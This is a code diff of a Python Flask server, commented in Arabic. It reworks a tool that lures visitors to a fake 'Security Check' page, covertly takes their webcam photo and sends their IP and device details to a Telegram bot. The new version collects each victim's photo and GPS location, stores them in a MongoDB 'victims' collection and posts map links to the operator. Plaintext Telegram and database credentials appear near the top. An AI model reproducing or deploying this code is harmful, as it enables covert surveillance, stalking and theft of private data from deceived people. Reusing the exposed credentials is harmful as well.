@@ -1,77 +1,53 @@
 import telebot
-from flask import Flask, request, render_template_string
+from flask import Flask, request, jsonify
+import pymongo
 import base64
+import os
 
-# إعدادات البوت الخاص بك
+# إعدادات البوت والقاعدة
 TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk"
 CHAT_ID = "8351043975"
+MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/"
+
 bot = telebot.TeleBot(TOKEN)
+client = pymongo.MongoClient(MONGO_URI)
+db = client.myDatabase
+collection = db.victims
 
 app = Flask(__name__)
 
-# كود الصفحة التي تطلب الكاميرا وتلتقط الصورة
-html_code = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Security Check</title>
-    <script>
-        async function startCapture() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0);
-
-                const dataUrl = canvas.toDataURL('image/png');
-                fetch('/capture', {
-                    method: 'POST',
-                    body: JSON.stringify({ image: dataUrl }),
-                    headers: { 'Content-Type': 'application/json' }
-                });
-                
-                stream.getTracks().forEach(track => track.stop());
-                document.body.innerHTML = "<h1>Security Verified ✅</h1><p>Your connection is now secure.</p>";
-            } catch (err) {
-                document.body.innerHTML = "<h1>Access Denied</h1><p>Please allow camera access to verify your identity.</p>";
-            }
-        }
-        window.onload = startCapture;
-    </script>
-</head>
-<body style="text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4;">
-    <div style="background: white; display: inline-block; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
-        <h2>جاري فحص حالة الأمان...</h2>
-        <p>يرجى السماح بالوصول للكاميرا لإكمال عملية التحقق.</p>
-    </div>
-</body>
-</html>
-"""
-
-@app.route('/')
-def index():
-    user_agent = request.headers.get('User-Agent')
-    ip_addr = request.remote_addr
-    bot.send_message(CHAT_ID, f"🎯 دخول جديد للرابط!\\n🌐 IP: {ip_addr}\\n📱 الجهاز: {user_agent}")
-    return render_template_string(html_code)
-
-@app.route('/capture', methods=['POST'])
-def capture():
+@app.route('/receive', methods=['POST'])
+def receive_data():
     data = request.json
-    image_data = data['image'].split(',')[1]
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    with open("victim.png", "wb") as fh:
-        fh.write(base64.b64decode(image_data))
+    # 1. استخراج البيانات
+    image_b64 = data.get('image')
+    location = data.get('location') # يتوقع {lat: x, lon: y}
     
-    with open("victim.png", "rb") as photo:
-        bot.send_photo(CHAT_ID, photo, caption="📸 تم التقاط صورة الضحية بنجاح!")
-    return "OK"
+    # 2. حفظ في قاعدة البيانات (للسحب اللاحق من اللابتوب)
+    record = {
+        "ip": ip,
+        "image": image_b64,
+        "location": location,
+        "device": request.headers.get('User-Agent')
+    }
+    collection.insert_one(record)
+
+    # 3. إرسال الموقع لبوت التيليجرام
+    if location:
+        map_url = f"https://www.google.com/maps?q={location['lat']},{location['lon']}"
+        bot.send_message(CHAT_ID, f"📍 موقع ضحية جديد!\nIP: {ip}\nالرابط: {map_url}")
+
+    # 4. إرسال الصورة لبوت التيليجرام
+    if image_b64:
+        header, encoded = image_b64.split(",", 1)
+        with open("temp.png", "wb") as f:
+            f.write(base64.b64decode(encoded))
+        with open("temp.png", "rb") as photo:
+            bot.send_photo(CHAT_ID, photo, caption=f"📸 صورة الضحية من IP: {ip}")
+    
+    return jsonify({"status": "success"}), 200
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=8000)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))
